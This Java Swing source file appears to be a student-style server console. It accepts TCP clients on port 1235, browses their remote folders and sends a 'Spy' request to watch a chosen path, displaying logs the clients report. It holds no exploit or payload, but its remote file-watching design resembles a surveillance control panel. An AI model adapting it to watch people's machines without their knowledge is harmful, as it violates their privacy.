import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.*;
import java.lang.reflect.Array;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import javax.swing.*;
import javax.swing.event.*;

public class App extends JPanel{



    // Clients List Components
    private static JList<String> clientList;

    private static List<Socket> clientSocketList =  new ArrayList<>();

    private static JList<String> folderList;

    private static String currentFolder;

    private static JList<String> logList;

    public App() {
        super();
        setPreferredSize(new Dimension(1000,600));
        setLayout(new BorderLayout());

        // Create Client List Panel
        JPanel leftPanel = createClientPanel();
        add(leftPanel,BorderLayout.WEST);

        // Create Folder Explorer Panel
        JPanel centerPanel = createExplorerPanel();
        add(centerPanel,BorderLayout.CENTER);

        // Create Log Panel
        JPanel rightPanel = createLogPanel();
        add(rightPanel,BorderLayout.EAST);
    }

    // Client Pannel
    public JPanel createClientPanel() {
        JPanel result = new JPanel(new BorderLayout());

        JPanel topPanel = new JPanel(new BorderLayout());
        JLabel clientLabel = new JLabel("Connected Clients");
        clientLabel.setHorizontalAlignment(SwingConstants.CENTER);
        topPanel.add(clientLabel, BorderLayout.CENTER);
        result.add(topPanel, BorderLayout.NORTH);

        clientList = new JList<>(new DefaultListModel<>());
        clientList.addListSelectionListener(new ListSelectionListener() {
            @Override
            public void valueChanged(ListSelectionEvent e) {
                if (!e.getValueIsAdjusting()) {
                    currentFolder = null;

                    int selectedIndex = clientList.getSelectedIndex();

                    if (selectedIndex == -1){
                        DefaultListModel<String> listModel = (DefaultListModel<String>) folderList.getModel();

                        listModel.clear();
                    }
                    else{
                        JFrame currentFrame = (JFrame) SwingUtilities.getWindowAncestor(clientList);
                        if (selectedIndex != -1) {
                            try {
                                sendRequestToClient(selectedIndex, currentFrame);
                            } catch (IOException e1) {
                                e1.printStackTrace();
                            }
                        }
                    }
                }
            }
        });

        JScrollPane scrollPane = new JScrollPane(clientList);
        scrollPane.setPreferredSize(new Dimension(200, 200));
        result.add(scrollPane, BorderLayout.CENTER);

        result.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        return result;
    }

    public JPanel createExplorerPanel() {
        JPanel result = new JPanel(new BorderLayout());

        JPanel topPanel = new JPanel(new BorderLayout());
        JLabel clientLabel = new JLabel("Folder Explorer");
        clientLabel.setHorizontalAlignment(SwingConstants.CENTER);
        topPanel.add(clientLabel, BorderLayout.CENTER);

        result.add(topPanel, BorderLayout.NORTH);

        folderList = new JList<>(new DefaultListModel<>());
        folderList.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent  e) {
                if (e.getClickCount() == 2) {
                    String selectedPath = folderList.getSelectedValue();
                    currentFolder = selectedPath;

                    int index = clientList.getSelectedIndex();
                    JFrame currentFrame = (JFrame) SwingUtilities.getWindowAncestor(folderList);
                    if (selectedPath != null && index != -1) {
                        try {
                            sendRequestToClient_2(index, selectedPath, currentFrame);
                        } catch (IOException e1) {
                            e1.printStackTrace();
                        }
                    }
                }
            }
        });

        JScrollPane scrollPane = new JScrollPane(folderList);
        scrollPane.setPreferredSize(new Dimension(200, 200));
        result.add(scrollPane, BorderLayout.CENTER);

        // Add Buttons
        JPanel buttonPanel = new JPanel(new FlowLayout());

        JButton btnBack = new JButton("Back");
        JButton btnSpy = new JButton("Spy");

        btnBack.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                int index = clientList.getSelectedIndex();
                JFrame currentFrame = (JFrame) SwingUtilities.getWindowAncestor(folderList);

                if (index != -1 && currentFolder != null) {
                    try {
                        sendBackRequest(index, currentFolder, currentFrame);
                        
                    } catch (Exception exx) {
                        // TODO: handle exception
                    }
                }
            }
        });

        btnSpy.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                int index = clientList.getSelectedIndex();
                JFrame currentFrame = (JFrame) SwingUtilities.getWindowAncestor(folderList);
                String path = folderList.getSelectedValue();
                if (index != -1 && path != null) {
                    try {
                        sendSpyRequest(index, path, currentFrame);
                        
                    } catch (Exception exx) {
                        // TODO: handle exception
                    }
                }
            }
        });

        buttonPanel.add(btnBack);
        buttonPanel.add(btnSpy);

        result.add(buttonPanel,BorderLayout.SOUTH);

        result.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        return result;
    }

    public JPanel createLogPanel() {
        JPanel result = new JPanel(new BorderLayout());

        JPanel topPanel = new JPanel(new BorderLayout());
        JLabel label = new JLabel("History");
        label.setHorizontalAlignment(SwingConstants.CENTER);
        topPanel.add(label, BorderLayout.CENTER);
        result.add(topPanel, BorderLayout.NORTH);

        logList = new JList<>(new DefaultListModel<>());

        JScrollPane scrollPane = new JScrollPane(logList);
        scrollPane.setPreferredSize(new Dimension(200, 200));
        result.add(scrollPane, BorderLayout.CENTER);

        result.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        return result;
    }

    private static void updateFolderListGUI(List<String> nameList, JList<String> folderList){
        DefaultListModel<String> listModel = (DefaultListModel<String>) folderList.getModel();

        listModel.clear();

        for (String name : nameList){
            listModel.addElement(name);
        }
    }

    private static void updateClientListGUI(List<Socket> clientSocket, JList<String> clientList){
        DefaultListModel<String> listModel = (DefaultListModel<String>) clientList.getModel();

        listModel.clear();

        for (int i = 0; i < clientSocket.size(); i++) {
            listModel.addElement(("Client " + String.valueOf(clientSocket.get(i).getPort())));
        }
    }
    
    private static BufferedReader getReader(Socket socket) throws IOException  {
            return new BufferedReader(new InputStreamReader(socket.getInputStream()));
    }

    private static PrintWriter getWriter(Socket socket) throws IOException{
            return new PrintWriter(socket.getOutputStream(), true);
    }

    private void sendRequestToClient(int index, JFrame frame) throws IOException{
        Socket client = clientSocketList.get(index);
        PrintWriter out = getWriter(client);

        out.println("Send Root Folder");
    }

    private void sendRequestToClient_2(int index ,String selectedPath, JFrame frame) throws IOException{
        Socket client = clientSocketList.get(index);
        PrintWriter out = getWriter(client);

        out.println("Send Sub Folder");
        out.println(selectedPath);
    }

    private void sendBackRequest(int index, String path, JFrame frame) throws IOException
    {
        Socket client = clientSocketList.get(index);
        PrintWriter out = getWriter(client);

        out.println("Send Back Folder");
        out.println(path);
    }

    private void sendSpyRequest(int index, String path, JFrame frame) throws IOException
    {
        Socket client = clientSocketList.get(index);
        PrintWriter out = getWriter(client);

        JFrame currentFrame = (JFrame) SwingUtilities.getWindowAncestor(folderList);

        JOptionPane.showMessageDialog(currentFrame, "Spy success" , "Inform", JOptionPane.INFORMATION_MESSAGE);

        // Send request
        out.println("Send Spy");
        out.println(path);
    }

    private static void createAndShowGUI() {
        JFrame.setDefaultLookAndFeelDecorated(true);
        JFrame frame = new JFrame("Server");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        App newContentPane = new App();
        newContentPane.setOpaque(true);
        frame.setContentPane(newContentPane);

        frame.pack();
        frame.setVisible(true);
    }


    public static void main(String[] args) throws Exception {
        createAndShowGUI();

        try {
            ServerSocket serverSocket = new ServerSocket(1235); // Port number for the server

            while (true) {
                // Accept client connections
                Socket clientSocket = serverSocket.accept();

                // Create a new thread for each client
                ClientHandler clientHandler = new ClientHandler(clientSocket);
                Thread clientThread = new Thread(clientHandler);
                clientThread.start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }   


    static class ClientHandler implements Runnable {
        private Socket clientSocket;

        public ClientHandler(Socket clientSocket) {
            this.clientSocket = clientSocket;
        }

        public void run() {
            try {
                // Add to Code List
                clientSocketList.add(clientSocket);

                // Add Client to GUI
                updateClientListGUI(clientSocketList, clientList);

                // Get input and output streams for the client
                BufferedReader in = getReader(clientSocket);

                while(true) {

                    String clientMessage;

                    if((clientMessage = in.readLine()) != null){
                        System.out.println("Received from client: " + clientMessage);

                        if (clientMessage.equals("Root Dir")){
                            String msg;
                            List<String> nameList = new ArrayList<>();
                            while((msg = in.readLine()) != null){
                                if(msg.equals("Over")) {
                                    updateFolderListGUI(nameList, folderList);

                                    break;
                                }
                                else{
                                    nameList.add(msg);
                                    System.out.println("Received from client: " + msg);
                                }
                            }
                        }
                        else if (clientMessage.equals("Sub Dir")){
                                        // Get response
                            List<String> nameList = new ArrayList<>();

                            String msg;
                            while((msg = in.readLine()) != null){
                                if(msg.equals("Over")) {
                                    updateFolderListGUI(nameList, folderList);

                                    break;
                                }
                                else{
                                    nameList.add(msg);
                                    System.out.println("Received from client: " + msg);
                                }
                            }
                        }
                        else if (clientMessage.equals("Back Dir")){
                            currentFolder = in.readLine();

                            System.out.println("receive " + currentFolder);

                            // Get response
                            List<String> nameList = new ArrayList<>();

                            String msg;
                            while((msg = in.readLine()) != null){
                                // 1st msg is fodler path after back

                                if(msg.equals("Over")) {
                                    updateFolderListGUI(nameList, folderList);

                                    break;
                                }
                                else{
                                    nameList.add(msg);
                                    System.out.println("Received from client: " + msg);
                                }
                            }
                        }
                        else if (clientMessage.equals("Send Log")){
                            String msg = in.readLine();

                            System.out.println(msg); 
                            
                            DefaultListModel<String> listModel = (DefaultListModel<String>) logList.getModel();

                            listModel.addElement("Client " + clientSocket.getPort() + ": " + msg);
                        }
                    }  
                }
            } catch (IOException e) {
                JFrame currentFrame = (JFrame) SwingUtilities.getWindowAncestor(folderList);
                JOptionPane.showMessageDialog(currentFrame, "Socket " + clientSocket.getPort() + " close" , "Alert", JOptionPane.INFORMATION_MESSAGE);

                clientSocketList.remove(clientSocket);
                updateClientListGUI(clientSocketList, clientList);
            }
        }
    }

}
